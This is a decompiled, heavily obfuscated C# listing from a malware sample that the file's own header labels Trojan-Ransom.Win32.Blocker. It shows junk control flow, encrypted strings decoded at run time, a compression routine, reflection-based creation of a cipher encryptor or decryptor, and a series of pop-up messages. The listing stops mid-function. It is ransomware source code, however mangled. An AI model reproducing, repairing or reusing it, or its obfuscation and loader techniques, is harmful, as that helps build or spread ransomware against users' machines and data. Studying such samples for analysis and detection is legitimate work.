// Decompiled with JetBrains decompiler
// Type: .
// Assembly: Holo, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 1692AE67-149A-45D4-AB0A-0CA3F19B28FA
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00100-msil\Trojan-Ransom.Win32.Blocker.btzw-fb43784740363420f3fd853f239a17b4f68de89292e77257010518f48115d3b3.exe

using \u0001;
using \u0002;
using \u0005;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using System;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Windows.Forms;

namespace \u0005
{
  internal class \u0004
  {
    [NonSerialized]
    internal static \u0004 \u000F;

    static void \u0001(int _param0, \u0004.\u0003 _param1, byte[] _param2, [In] int obj3)
    {
      if (_param1.\u0004 > 0)
        throw new InvalidOperationException();
      int num1 = obj3;
label_1:
      int num2;
      for (int index = 32768; num1 > index; num1 = num2)
      {
        num2 = _param0;
        if (false)
        {
          num1 = num2;
          goto label_1;
        }
        else
        {
          int num3 = obj3;
          if (false)
          {
            index = num3;
          }
          else
          {
            if (true)
              num3 -= 32768;
            int num4 = num2 + num3;
            if (true)
            {
              _param0 = num4;
              num4 = 32768;
            }
            obj3 = num4;
            break;
          }
        }
      }
      do
      {
        Array.Copy((Array) _param2, _param0, (Array) _param1.\u0001, 0, obj3);
        _param1.\u0003 = obj3 & (int) short.MaxValue;
      }
      while (false);
    }

    static unsafe void \u0001(\u0004.\u0007.\u0001 _param0, [In] \u0004.\u0007.\u0001 obj1)
    {
      void* voidPtr;
      if (true)
      {
        // ISSUE: untyped stack allocation
        voidPtr = (void*) __untypedstackalloc(20);
        *(int*) ((IntPtr) voidPtr + 8) = -1;
        *(int*) ((IntPtr) voidPtr + 12) = 0;
        goto label_17;
      }
label_5:
      *(int*) ((IntPtr) voidPtr + 4) = 3;
      int num;
      if (*(int*) ((IntPtr) voidPtr + 8) != *(int*) ((IntPtr) voidPtr + 16))
      {
        short[] numArray;
        IntPtr index;
        (numArray = _param0.\u0001)[(int) (index = (IntPtr) *(int*) ((IntPtr) voidPtr + 16))] = (short) ((int) numArray[index] + 1);
        num = 0;
      }
label_7:
      *(int*) ((IntPtr) voidPtr + 8) = *(int*) ((IntPtr) voidPtr + 16);
      *(int*) ((IntPtr) voidPtr + 12) = *(int*) ((IntPtr) voidPtr + 12) + 1;
      while (*(int*) ((IntPtr) voidPtr + 12) < obj1.\u0002 && *(int*) ((IntPtr) voidPtr + 8) == (int) obj1.\u0001[*(int*) ((IntPtr) voidPtr + 12)])
      {
        *(int*) ((IntPtr) voidPtr + 12) = *(int*) ((IntPtr) voidPtr + 12) + 1;
        if (++num >= *(int*) voidPtr)
          break;
      }
      if (num < *(int*) ((IntPtr) voidPtr + 4))
      {
        short[] numArray;
        IntPtr index;
        (numArray = _param0.\u0001)[(int) (index = (IntPtr) *(int*) ((IntPtr) voidPtr + 8))] = (short) ((int) numArray[index] + (int) (short) num);
      }
      else if (*(int*) ((IntPtr) voidPtr + 8) != 0)
      {
        short[] numArray;
        (numArray = _param0.\u0001)[16] = (short) ((int) numArray[16] + 1);
      }
      else if (num <= 10)
      {
        short[] numArray;
        (numArray = _param0.\u0001)[17] = (short) ((int) numArray[17] + 1);
      }
      else
      {
        short[] numArray;
        (numArray = _param0.\u0001)[18] = (short) ((int) numArray[18] + 1);
      }
label_17:
      if (*(int*) ((IntPtr) voidPtr + 12) >= obj1.\u0002)
        return;
      num = 1;
      *(int*) ((IntPtr) voidPtr + 16) = (int) obj1.\u0001[*(int*) ((IntPtr) voidPtr + 12)];
      if (*(int*) ((IntPtr) voidPtr + 16) != 0)
      {
        *(int*) voidPtr = 6;
        goto label_5;
      }
      else
      {
        *(int*) voidPtr = 138;
        *(int*) ((IntPtr) voidPtr + 4) = 3;
        goto label_7;
      }
    }

    static void \u0001(int _param0, byte[] _param1, int _param2, [In] \u0004.\u0002 obj3)
    {
      if (true)
        goto label_6;
label_4:
      obj3.\u0003 += 8;
label_5:
      obj3.\u0001 = _param1;
      obj3.\u0001 = _param0;
      int num;
      obj3.\u0002 = num;
      return;
label_6:
      if (obj3.\u0001 < obj3.\u0002)
        throw new InvalidOperationException();
      num = _param0 + _param2;
      if (0 > _param0 || _param0 > num || num > _param1.Length)
        throw new ArgumentOutOfRangeException();
      if ((_param2 & 1) != 0)
      {
        obj3.\u0001 |= (uint) (((int) _param1[_param0++] & (int) byte.MaxValue) << obj3.\u0003);
        goto label_4;
      }
      else
        goto label_5;
    }

    static \u0004.\u0004 \u0001([In] \u0004.\u0005 obj0)
    {
      byte[] numArray = new byte[obj0.\u000E];
      Array.Copy((Array) obj0.\u0002, obj0.\u0008, (Array) numArray, 0, obj0.\u000E);
      return new \u0004.\u0004(numArray);
    }

    static unsafe int \u0001(int _param0, \u0004.\u0001 _param1, int _param2, [In] byte[] obj3)
    {
      // ISSUE: untyped stack allocation
      void* voidPtr = (void*) __untypedstackalloc(8);
      *(int*) voidPtr = 0;
      int num1;
      int num2;
      do
      {
        num1 = _param1.\u0013;
        num2 = 11;
        if (num2 != 0)
        {
          if (num1 != num2)
            goto label_8;
label_3:
          if (!\u0004.\u0001(_param1))
          {
            int num3 = _param1.\u0001.\u0004;
            num2 = 0;
            num1 = num3;
            goto label_5;
          }
          else
            continue;
label_8:
          *(int*) ((IntPtr) voidPtr + 4) = \u0004.\u0001(obj3, _param2, _param0, _param1.\u0001);
          _param2 += *(int*) ((IntPtr) voidPtr + 4);
          *(int*) voidPtr = *(int*) voidPtr + *(int*) ((IntPtr) voidPtr + 4);
          _param0 -= *(int*) ((IntPtr) voidPtr + 4);
          if (_param0 != 0)
            goto label_3;
          else
            goto label_2;
        }
label_5:;
      }
      while (num1 > num2 && _param1.\u0013 != 11);
      goto label_6;
label_2:
      return *(int*) voidPtr;
label_6:
      return *(int*) voidPtr;
    }

    static unsafe object \u0001([In] \u0003.\u0002 obj0)
    {
      int num1 = 173;
      void* voidPtr1;
      Decimal num2;
      if (num1 != 0)
      {
        // ISSUE: untyped stack allocation
        voidPtr1 = (void*) __untypedstackalloc(num1);
        num2 = 784488618M;
        *(double*) voidPtr1 = 5026281.0;
        *(sbyte*) ((IntPtr) voidPtr1 + 172) = (sbyte) 1;
        if (*(sbyte*) ((IntPtr) voidPtr1 + 172) != (sbyte) 0)
        {
          *(int*) ((IntPtr) voidPtr1 + 112) = 8006698;
          goto label_61;
        }
        else
        {
          *(int*) ((IntPtr) voidPtr1 + 116) = 325205445;
          goto label_61;
        }
      }
      else
        goto label_59;
label_58:
      *(sbyte*) ((IntPtr) voidPtr1 + 172) = (sbyte) 0;
      num1 = (int) *(sbyte*) ((IntPtr) voidPtr1 + 172);
label_59:
      if (num1 != 0)
      {
        *(double*) voidPtr1 = 12.0;
        try
        {
        }
        catch (Exception ex1)
        {
          ProjectData.SetProjectError(ex1);
          void* voidPtr2;
          *(long*) ((IntPtr) voidPtr2 + 8) = 954L;
          *(sbyte*) ((IntPtr) voidPtr2 + 172) = (sbyte) 0;
          if (*(sbyte*) ((IntPtr) voidPtr2 + 172) != (sbyte) 0)
          {
            string str1 = \u0004.\u000F(425);
            try
            {
            }
            catch (Exception ex2)
            {
              ProjectData.SetProjectError(ex2);
              *(double*) voidPtr2 = 16.0;
              string str2 = \u0004.\u000F(667);
              string str3 = \u0004.\u000F(672);
              try
              {
              }
              catch (Exception ex3)
              {
                ProjectData.SetProjectError(ex3);
                *(int*) ((IntPtr) voidPtr2 + 128) = 1678;
                do
                {
                  ProjectData.ClearProjectError();
                }
                while (false);
              }
              *(double*) voidPtr2 = 1.0;
              *(double*) voidPtr2 = 4061.0;
              ProjectData.ClearProjectError();
            }
            *(sbyte*) ((IntPtr) voidPtr2 + 168) = (sbyte) 1;
            *(int*) ((IntPtr) voidPtr2 + 124) = 276123285;
            *(sbyte*) ((IntPtr) voidPtr2 + 169) = (sbyte) 1;
            string str4 = \u0004.\u000F(942);
            *(int*) ((IntPtr) voidPtr2 + 120) = 6;
            while (true)
            {
              *(sbyte*) ((IntPtr) voidPtr2 + 172) = (sbyte) 1;
              if (*(sbyte*) ((IntPtr) voidPtr2 + 172) != (sbyte) 0)
              {
                num2 = 1878M;
                *(long*) ((IntPtr) voidPtr2 + 24) = 896616638L;
                *(long*) ((IntPtr) voidPtr2 + 16) = 37281L;
                *(double*) ((IntPtr) voidPtr2 + 32) = 32355481.0;
                int num3 = (int) MessageBox.Show(\u0004.\u000F(1148));
              }
              else
                break;
            }
            num2 = 7708M;
            do
            {
              *(sbyte*) ((IntPtr) voidPtr2 + 172) = (sbyte) 0;
            }
            while (*(sbyte*) ((IntPtr) voidPtr2 + 172) != (sbyte) 0);
            *(double*) voidPtr2 = 236028.0;
            int num4 = (int) MessageBox.Show(\u0004.\u000F(1422));
            int num5 = (int) MessageBox.Show(\u0004.\u000F(1568));
            while (true)
            {
              *(sbyte*) ((IntPtr) voidPtr2 + 172) = (sbyte) 0;
              if (true)
                goto label_49;
label_44:
              *(double*) ((IntPtr) voidPtr2 + 64) = 24517393.0;
label_45:
              *(sbyte*) ((IntPtr) voidPtr2 + 172) = (sbyte) 1;
              if (*(sbyte*) ((IntPtr) voidPtr2 + 172) != (sbyte) 0)
              {
                *(double*) ((IntPtr) voidPtr2 + 56) = 6.0;
                *(int*) ((IntPtr) voidPtr2 + 136) = 1;
                try
                {
                }
                catch (Exception ex4)
                {
                  ProjectData.SetProjectError(ex4);
                  if (true)
                  {
                    *(int*) ((IntPtr) voidPtr2 + 144) = 33030;
                    int num6;
                    int num7;
                    do
                    {
                      do
                      {
                        *(double*) ((IntPtr) voidPtr2 + 72) = 259.0;
                      }
                      while (false);
                      *(int*) ((IntPtr) voidPtr2 + 144) = checked (*(int*) unchecked ((IntPtr) voidPtr2 + 144) + 1);
                      num6 = *(int*) ((IntPtr) voidPtr2 + 144);
                      *(int*) ((IntPtr) voidPtr2 + 164) = 868454;
                      num7 = *(int*) ((IntPtr) voidPtr2 + 164);
                    }
                    while (num6 <= num7);
                    int num8 = (int) MessageBox.Show(\u0004.\u000F(1589));
                    *(double*) voidPtr2 = 0.0;
                    num2 = 0M;
                  }
                  ProjectData.ClearProjectError();
                }
                try
                {
                }
                catch (Exception ex5)
                {
                  ProjectData.SetProjectError(ex5);
                  int num9 = (int) MessageBox.Show(\u0004.\u000F(1939));
                  *(double*) voidPtr2 = 8408871.0;
                  num2 = 0M;
                  *(double*) ((IntPtr) voidPtr2 + 88) = 70.0;
                  while (true)
                  {
                    do
                    {
                      if (true)
                      {
                        *(sbyte*) ((IntPtr) voidPtr2 + 172) = (sbyte) 1;
                        if (*(sbyte*) ((IntPtr) voidPtr2 + 172) == (sbyte) 0)
                        {
                          *(double*) ((IntPtr) voidPtr2 + 80) = 0.0;
                          *(double*) ((IntPtr) voidPtr2 + 96) = 78.0;
                        }
                        else
                          goto label_29;
                      }
                      ProjectData.ClearProjectError();
                    }
                    while (false);
                    break;
label_29:;
                  }
                }
                string str5 = \u0004.\u000F(1980);
                *(sbyte*) ((IntPtr) voidPtr2 + 172) = (sbyte) 0;
                if (*(sbyte*) ((IntPtr) voidPtr2 + 172) != (sbyte) 0)
                {
                  *(int*) ((IntPtr) voidPtr2 + 148) = 710554242;
                  goto label_38;
                }
label_36:
                *(int*) ((IntPtr) voidPtr2 + 152) = 0;
label_38:
                while (true)
                {
                  *(sbyte*) ((IntPtr) voidPtr2 + 172) = (sbyte) 1;
                  if (*(sbyte*) ((IntPtr) voidPtr2 + 172) != (sbyte) 0)
                  {
                    num2 = 5930M;
                    *(double*) voidPtr2 = 956.0;
                    *(long*) ((IntPtr) voidPtr2 + 104) = 2L;
                  }
                  else
                    break;
                }
                if (true)
                {
                  try
                  {
                  }
                  catch (Exception ex6)
                  {
                    ProjectData.SetProjectError(ex6);
                    *(sbyte*) ((IntPtr) voidPtr2 + 172) = (sbyte) 0;
                    if (*(sbyte*) ((IntPtr) voidPtr2 + 172) == (sbyte) 0)
                      ;
                    ProjectData.ClearProjectError();
                  }
                  *(long*) ((IntPtr) voidPtr2 + 40) = 1L;
                  *(double*) ((IntPtr) voidPtr2 + 48) = 59885639.0;
                  *(sbyte*) ((IntPtr) voidPtr2 + 171) = (sbyte) 0;
                  *(int*) ((IntPtr) voidPtr2 + 140) = 902570;
                  *(int*) ((IntPtr) voidPtr2 + 132) = 1;
                  goto label_44;
                }
                else
                  goto label_36;
              }
              else
              {
                *(sbyte*) ((IntPtr) voidPtr2 + 170) = (sbyte) 1;
                *(sbyte*) ((IntPtr) voidPtr2 + 172) = (sbyte) 0;
                if (*(sbyte*) ((IntPtr) voidPtr2 + 172) == (sbyte) 0)
                  ;
                continue;
              }
label_49:
              if (*(sbyte*) ((IntPtr) voidPtr2 + 172) != (sbyte) 0)
                goto label_45;
              else
                break;
            }
            *(sbyte*) ((IntPtr) voidPtr2 + 172) = (sbyte) 0;
            if (*(sbyte*) ((IntPtr) voidPtr2 + 172) != (sbyte) 0)
            {
              int num10 = (int) Interaction.MsgBox((object) \u0004.\u000F(2089));
            }
            else
              *(int*) ((IntPtr) voidPtr2 + 156) = 2457;
          }
          *(sbyte*) ((IntPtr) voidPtr2 + 172) = (sbyte) 0;
          if (*(sbyte*) ((IntPtr) voidPtr2 + 172) != (sbyte) 0)
          {
            int num11 = (int) Interaction.MsgBox((object) \u0004.\u000F(2102));
          }
          else
            *(int*) ((IntPtr) voidPtr2 + 160) = 52657318;
          ProjectData.ClearProjectError();
        }
        goto label_58;
      }
      else
      {
        int num12 = (int) Interaction.MsgBox((object) \u0004.\u000F(2127));
      }
label_61:
      *(sbyte*) ((IntPtr) voidPtr1 + 172) = (sbyte) 0;
      if (*(sbyte*) ((IntPtr) voidPtr1 + 172) == (sbyte) 0)
        return (object) 32614;
      *(double*) voidPtr1 = 67482609.0;
      *(double*) voidPtr1 = 905129313.0;
      goto label_58;
    }

    static unsafe void \u0001([In] \u0004.\u0007 obj0)
    {
      // ISSUE: untyped stack allocation
      void* voidPtr = (void*) __untypedstackalloc(20);
      *(int*) voidPtr = 0;
      while (*(int*) voidPtr < obj0.\u000E)
      {
        *(int*) ((IntPtr) voidPtr + 4) = (int) obj0.\u0002[*(int*) voidPtr] & (int) byte.MaxValue;
        int num1 = (int) obj0.\u0001[*(int*) voidPtr];
        int num2 = num1 - 1;
        if (num1 != 0)
        {
          *(int*) ((IntPtr) voidPtr + 8) = \u0004.\u0001(obj0, *(int*) ((IntPtr) voidPtr + 4));
          \u0004.\u0001(obj0.\u0001, *(int*) ((IntPtr) voidPtr + 8));
          *(int*) ((IntPtr) voidPtr + 12) = (*(int*) ((IntPtr) voidPtr + 8) - 261) / 4;
          if (*(int*) ((IntPtr) voidPtr + 12) > 0 && *(int*) ((IntPtr) voidPtr + 12) <= 5)
            \u0004.\u0001(obj0.\u0001, *(int*) ((IntPtr) voidPtr + 4) & (1 << *(int*) ((IntPtr) voidPtr + 12)) - 1, *(int*) ((IntPtr) voidPtr + 12));
          *(int*) ((IntPtr) voidPtr + 16) = \u0004.\u0001(obj0, num2);
          \u0004.\u0001(obj0.\u0002, *(int*) ((IntPtr) voidPtr + 16));
          *(int*) ((IntPtr) voidPtr + 12) = *(int*) ((IntPtr) voidPtr + 16) / 2 - 1;
          if (*(int*) ((IntPtr) voidPtr + 12) > 0)
            \u0004.\u0001(obj0.\u0001, num2 & (1 << *(int*) ((IntPtr) voidPtr + 12)) - 1, *(int*) ((IntPtr) voidPtr + 12));
        }
        else
          \u0004.\u0001(obj0.\u0001, *(int*) ((IntPtr) voidPtr + 4));
        *(int*) voidPtr = *(int*) voidPtr + 1;
      }
      \u0004.\u0001(obj0.\u0001, 256);
    }

    static unsafe bool \u0001(bool _param0, \u0004.\u0008 _param1, [In] bool obj2)
    {
      int num1 = 24;
label_1:
      // ISSUE: untyped stack allocation
      void* voidPtr = (void*) __untypedstackalloc(num1);
      if (_param1.\u0015 >= 262)
        goto label_37;
      else
        goto label_39;
label_2:
      int num2;
      if (num2 == 0)
        return false;
label_37:
      while (_param1.\u0015 >= 262 || obj2)
      {
        if (_param1.\u0015 != 0)
          goto label_9;
        else
          goto label_41;
label_6:
        \u0004.\u0007 obj1 = _param1.\u0001;
        byte[] numArray = _param1.\u0001;
        *(int*) ((IntPtr) voidPtr + 12) = _param1.\u0013;
label_7:
        if (true)
        {
          *(int*) ((IntPtr) voidPtr + 20) = _param1.\u0014 - _param1.\u0013;
          \u0004.\u0001(numArray, *(int*) ((IntPtr) voidPtr + 20), *(int*) ((IntPtr) voidPtr + 12), obj1, _param0);
          _param1.\u0013 = _param1.\u0014;
          return false;
        }
        goto label_16;
label_9:
        if (_param1.\u0014 >= 65274)
          \u0004.\u0001(_param1);
        *(int*) voidPtr = _param1.\u0011;
        int num3;
        do
        {
          num3 = _param1.\u0012;
          if (_param1.\u0015 >= 3)
          {
            *(int*) ((IntPtr) voidPtr + 4) = \u0004.\u0001(_param1);
            if (*(int*) ((IntPtr) voidPtr + 4) == 0 || _param1.\u0014 - *(int*) ((IntPtr) voidPtr + 4) > 32506 || !\u0004.\u0001(*(int*) ((IntPtr) voidPtr + 4), _param1) || _param1.\u0012 > 5 || _param1.\u0012 != 3 || _param1.\u0014 - _param1.\u0011 <= 4096)
              goto label_16;
          }
          else
            goto label_16;
        }
        while (false);
        _param1.\u0012 = 2;
label_16:
        int num4;
        if (num3 >= 3 && _param1.\u0012 <= num3)
        {
          \u0004.\u0007 obj3 = _param1.\u0001;
          *(int*) ((IntPtr) voidPtr + 16) = _param1.\u0014 - 1 - *(int*) voidPtr;
          \u0004.\u0001(*(int*) ((IntPtr) voidPtr + 16), obj3, num3);
          int num5 = num3;
          if (true)
          {
            num3 = num5 - 2;
          }
          else
          {
            num4 = num5;
            goto label_35;
          }
        }
        else
          goto label_24;
label_19:
        ++_param1.\u0014;
        --_param1.\u0015;
        if (_param1.\u0015 >= 3)
          \u0004.\u0001(_param1);
        num4 = --num3;
label_22:
        if (num4 <= 0)
        {
          ++_param1.\u0014;
          --_param1.\u0015;
          _param1.\u0001 = false;
          _param1.\u0012 = 2;
          goto label_27;
        }
        else
          goto label_19;
label_24:
        if (_param1.\u0001)
          \u0004.\u0001(_param1.\u0001, (int) _param1.\u0001[_param1.\u0014 - 1] & (int) byte.MaxValue);
        _param1.\u0001 = true;
        ++_param1.\u0014;
        --_param1.\u0015;
label_27:
        int num6 = _param1.\u0001.\u000E;
        if (false)
        {
          num1 = num6;
          goto label_1;
        }
        else if (num6 >= 16384)
        {
          *(int*) ((IntPtr) voidPtr + 8) = _param1.\u0014 - _param1.\u0013;
          num2 = _param1.\u0001 ? 1 : 0;
          if (true)
          {
            if (num2 != 0)
              *(int*) ((IntPtr) voidPtr + 8) = *(int*) ((IntPtr) voidPtr + 8) - 1;
            bool flag = _param0 && _param1.\u0015 == 0 && !_param1.\u0001;
            obj1 = _param1.\u0001;
            numArray = _param1.\u0001;
            if (true)
            {
              *(int*) ((IntPtr) voidPtr + 12) = _param1.\u0013;
              \u0004.\u0001(numArray, *(int*) ((IntPtr) voidPtr + 8), *(int*) ((IntPtr) voidPtr + 12), obj1, flag);
              if (true)
              {
                _param1.\u0013 += *(int*) ((IntPtr) voidPtr + 8);
                num4 = !flag ? 1 : 0;
              }
              else
                goto label_6;
            }
            else
              goto label_7;
          }
          else
            goto label_2;
        }
        else
          continue;
label_35:
        if (true)
          return num4 != 0;
        goto label_22;
label_41:
        if (_param1.\u0001)
          goto label_42;
label_5:
        _param1.\u0001 = false;
        goto label_6;
label_42:
        \u0004.\u0001(_param1.\u0001, (int) _param1.\u0001[_param1.\u0014 - 1] & (int) byte.MaxValue);
        goto label_5;
      }
      return true;
label_39:
      num2 = obj2 ? 1 : 0;
      goto label_2;
    }

    static unsafe object \u0001([In] \u0002.\u0002 obj0)
    {
      // ISSUE: untyped stack allocation
      void* voidPtr = (void*) __untypedstackalloc(48);
      *(sbyte*) ((IntPtr) voidPtr + 44) = (sbyte) 1;
      *(long*) voidPtr = 0L;
      *(sbyte*) ((IntPtr) voidPtr + 44) = (sbyte) 0;
      string str1 = \u0004.\u000F(2220);
      int num1;
      if (true)
        num1 = 7;
      else
        goto label_3;
label_2:
      long num2 = (long) num1;
      goto label_20;
label_3:
      if (*(sbyte*) ((IntPtr) voidPtr + 47) != (sbyte) 0)
        *(int*) ((IntPtr) voidPtr + 32) = 16;
      else
        *(int*) ((IntPtr) voidPtr + 36) = 8077798;
      *(long*) voidPtr = 20L;
      Decimal num3 = 9567624M;
      str1 = \u0004.\u000F(2398);
      num3 = 1M;
      num2 = 61522L;
      if (true)
      {
        num3 = new Decimal(num2);
label_9:
        while (true)
        {
          *(sbyte*) ((IntPtr) voidPtr + 47) = (sbyte) 1;
          while (*(sbyte*) ((IntPtr) voidPtr + 47) == (sbyte) 0)
          {
            while (true)
            {
              *(sbyte*) ((IntPtr) voidPtr + 47) = (sbyte) 1;
              if (*(sbyte*) ((IntPtr) voidPtr + 47) != (sbyte) 0)
              {
                *(long*) ((IntPtr) voidPtr + 16) = 17377L;
                *(sbyte*) ((IntPtr) voidPtr + 46) = (sbyte) 1;
                *(sbyte*) ((IntPtr) voidPtr + 45) = (sbyte) 1;
                *(long*) ((IntPtr) voidPtr + 24) = 7148163L;
                *(int*) ((IntPtr) voidPtr + 40) = 533022344;
              }
              else
                break;
            }
            if (true)
            {
              *(sbyte*) ((IntPtr) voidPtr + 44) = (sbyte) 1;
              object obj;
              do
              {
                if (true)
                {
                  int num4 = (int) MessageBox.Show(\u0004.\u000F(2435));
                  if (true)
                  {
                    string str2 = \u0004.\u000F(2697);
                    num1 = 4780142;
                    if (num1 != 0)
                      obj = (object) num1;
                    else
                      goto label_2;
                  }
                  else
                    goto label_21;
                }
                else
                  goto label_9;
              }
              while (false);
              return obj;
            }
          }
          num3 = 4635840M;
        }
      }
label_20:
      num3 = new Decimal(num2);
label_21:
      *(long*) ((IntPtr) voidPtr + 8) = 7474L;
      *(sbyte*) ((IntPtr) voidPtr + 47) = (sbyte) 0;
      goto label_3;
    }

    static byte[] \u0001(byte[] _param0, byte[] _param1, byte[] _param2) => \u0004.\u0001(2, _param0, _param2, _param1);

    static ICryptoTransform \u0001(
      byte[] _param0,
      \u0005.\u0003 _param1,
      byte[] _param2,
      [In] bool obj3)
    {
      _param1.\u0001.GetProperty("Key").GetSetMethod().Invoke(_param1.\u0001, new object[1]
      {
        (object) _param0
      });
      _param1.\u0001.GetProperty("IV").GetSetMethod().Invoke(_param1.\u0001, new object[1]
      {
        (object) _param2
      });
      return (ICryptoTransform) _param1.\u0001.GetMethod(obj3 ? "CreateDecryptor" : "CreateEncryptor", new System.Type[0]).Invoke(_param1.\u0001, new object[0]);
    }

    static void \u0001(\u0004.\u0006 _param0, [In] byte[] obj1) => \u0004.\u0001(_param0.\u0001, obj1);

    static unsafe object \u0001([In] \u0003.\u0002 obj0)
    {
      // ISSUE: untyped stack allocation
      void* voidPtr1 = (void*) __untypedstackalloc(120);
label_1:
      string str1 = \u0004.\u000F(2887);
      string str2 = \u0004.\u000F(2980);
      while (true)
      {
        *(sbyte*) ((IntPtr) voidPtr1 + 119) = (sbyte) 1;
        if (*(sbyte*) ((IntPtr) voidPtr1 + 119) != (sbyte) 0)
        {
          *(long*) voidPtr1 = 410036683L;
          try
          {
          }
          catch (Exception ex1)
          {
            ProjectData.SetProjectError(ex1);
            void* voidPtr2;
            *(long*) ((IntPtr) voidPtr2 + 8) = 96042281L;
            while (true)
            {
              *(sbyte*) ((IntPtr) voidPtr2 + 119) = (sbyte) 1;
              if (*(sbyte*) ((IntPtr) voidPtr2 + 119) != (sbyte) 0)
              {
                *(long*) ((IntPtr) voidPtr2 + 16) = 620L;
                *(sbyte*) ((IntPtr) voidPtr2 + 119) = (sbyte) 1;
                if (*(sbyte*) ((IntPtr) voidPtr2 + 119) != (sbyte) 0)
                  *(sbyte*) ((IntPtr) voidPtr2 + 117) = (sbyte) 0;
                else
                  goto label_33;
              }
              else
                goto label_40;
label_12:
              long num1;
              while (true)
              {
                *(sbyte*) ((IntPtr) voidPtr2 + 119) = (sbyte) 0;
                if (*(sbyte*) ((IntPtr) voidPtr2 + 119) != (sbyte) 0)
                {
                  *(double*) ((IntPtr) voidPtr2 + 40) = 1.0;
                  num1 = 29L;
                  if (true)
                  {
                    Decimal num2 = new Decimal(num1);
                    *(int*) ((IntPtr) voidPtr2 + 84) = 3;
                    *(double*) ((IntPtr) voidPtr2 + 48) = 5.0;
                    if (true)
                    {
                      string str3 = \u0004.\u000F(3017);
                      int num3 = (int) MessageBox.Show(\u0004.\u000F(3283));
                      str1 = \u0004.\u000F(3332);
                      int num4 = (int) MessageBox.Show(\u0004.\u000F(3570));
                      string str4 = \u0004.\u000F(3888);
                      *(int*) ((IntPtr) voidPtr2 + 92) = 1;
                    }
                    else
                      goto label_34;
                  }
                  else
                    goto label_20;
                }
                else
                  goto label_13;
label_9:
                *(int*) ((IntPtr) voidPtr2 + 88) = 41;
                *(int*) ((IntPtr) voidPtr2 + 92) = checked (*(int*) unchecked ((IntPtr) voidPtr2 + 92) + 1);
label_10:
                int num5 = *(int*) ((IntPtr) voidPtr2 + 92);
                *(int*) ((IntPtr) voidPtr2 + 112) = 5382463;
                int num6 = *(int*) ((IntPtr) voidPtr2 + 112);
                if (num5 > num6)
                {
                  *(long*) ((IntPtr) voidPtr2 + 24) = 847246L;
                  *(double*) ((IntPtr) voidPtr2 + 32) = 8.0;
                  continue;
                }
                goto label_9;
label_13:
                *(sbyte*) ((IntPtr) voidPtr2 + 116) = (sbyte) 1;
                *(int*) ((IntPtr) voidPtr2 + 80) = 672427595;
                if (false)
                  goto label_10;
                else
                  break;
              }
label_15:
              *(sbyte*) ((IntPtr) voidPtr2 + 119) = (sbyte) 0;
label_16:
              if (*(sbyte*) ((IntPtr) voidPtr2 + 119) != (sbyte) 0)
              {
                *(double*) ((IntPtr) voidPtr2 + 56) = 339806080.0;
                goto label_15;
              }
              else
              {
                while (true)
                {
                  *(sbyte*) ((IntPtr) voidPtr2 + 119) = (sbyte) 1;
                  if (*(sbyte*) ((IntPtr) voidPtr2 + 119) != (sbyte) 0)
                  {
                    *(sbyte*) ((IntPtr) voidPtr2 + 118) = (sbyte) 1;
                    *(long*) ((IntPtr) voidPtr2 + 64) = 6953L;
                  }
                  else
                    break;
                }
                num1 = 17909L;
              }
label_20:
              Decimal num7 = new Decimal(num1);
              try
              {
              }
              catch (Exception ex2)
              {
                ProjectData.SetProjectError(ex2);
                if (false)
                  ;
                string str5 = \u0004.\u000F(3909);
                string str6 = \u0004.\u000F(4026);
                string str7 = \u0004.\u000F(4071);
                *(sbyte*) ((IntPtr) voidPtr2 + 119) = (sbyte) 0;
                if (*(sbyte*) ((IntPtr) voidPtr2 + 119) != (sbyte) 0)
                  *(int*) ((IntPtr) voidPtr2 + 96) = 8147;
                else
                  *(int*) ((IntPtr) voidPtr2 + 100) = 54091358;
                while (true)
                {
                  *(sbyte*) ((IntPtr) voidPtr2 + 119) = (sbyte) 0;
                  if (*(sbyte*) ((IntPtr) voidPtr2 + 119) != (sbyte) 0)
                  {
                    *(sbyte*) ((IntPtr) voidPtr2 + 119) = (sbyte) 1;
                    if (*(sbyte*) ((IntPtr) voidPtr2 + 119) != (sbyte) 0)
                    {
                      *(double*) ((IntPtr) voidPtr2 + 72) = 0.0;
                      *(int*) ((IntPtr) voidPtr2 + 104) = 680819;
                      *(sbyte*) ((IntPtr) voidPtr2 + 119) = (sbyte) 1;
                      if (*(sbyte*) ((IntPtr) voidPtr2 + 119) == (sbyte) 0)
                        ;
                    }
                  }
                  else
                    break;
                }
                ProjectData.ClearProjectError();
              }
              int num8 = (int) Interaction.MsgBox((object) \u0004.\u000F(4417));
label_33:
label_34:
              *(sbyte*) ((IntPtr) voidPtr2 + 119) = (sbyte) 1;
              if (*(sbyte*) ((IntPtr) voidPtr2 + 119) != (sbyte) 0)
              {
                if (true)
                {
                  int num9 = (int) Interaction.MsgBox((object) \u0004.\u000F(4651));
                }
                else
                  goto label_12;
              }
              else
                *(int*) ((IntPtr) voidPtr2 + 108) = 5298;
              continue;
label_40:
              ProjectData.ClearProjectError();
              if (false)
                goto label_16;
              else
                break;
            }
          }
          if (true)
          {
            int num = (int) Interaction.MsgBox((object) \u0004.\u000F(4660));
          }
          else
            goto label_1;
        }
        else
          break;
      }
      return (object) 5;
    }

    static unsafe void \u0001(
      byte[] _param0,
      int _param1,
      int _param2,
      \u0004.\u0007 _param3,
      [In] bool obj4)
    {
      // ISSUE: untyped stack allocation
      void* voidPtr = (void*) __untypedstackalloc(24);
      short[] numArray;
      (numArray = _param3.\u0001.\u0001)[256] = (short) ((int) numArray[256] + 1);
      \u0004.\u0001(_param3.\u0001);
      \u0004.\u0001(_param3.\u0002);
      \u0004.\u0007.\u0001 obj1 = _param3.\u0001;
      \u0004.\u0001(_param3.\u0003, obj1);
      \u0004.\u0007.\u0001 obj2 = _param3.\u0002;
      \u0004.\u0001(_param3.\u0003, obj2);
      \u0004.\u0001(_param3.\u0003);
      *(int*) voidPtr = 4;
      *(int*) ((IntPtr) voidPtr + 4) = 18;
      while (*(int*) ((IntPtr) voidPtr + 4) > *(int*) voidPtr)
      {
        if (_param3.\u0003.\u0001[\u0004.\u0007.\u0001[*(int*) ((IntPtr) voidPtr + 4)]] > (byte) 0)
          *(int*) voidPtr = *(int*) ((IntPtr) voidPtr + 4) + 1;
        *(int*) ((IntPtr) voidPtr + 4) = *(int*) ((IntPtr) voidPtr + 4) - 1;
      }
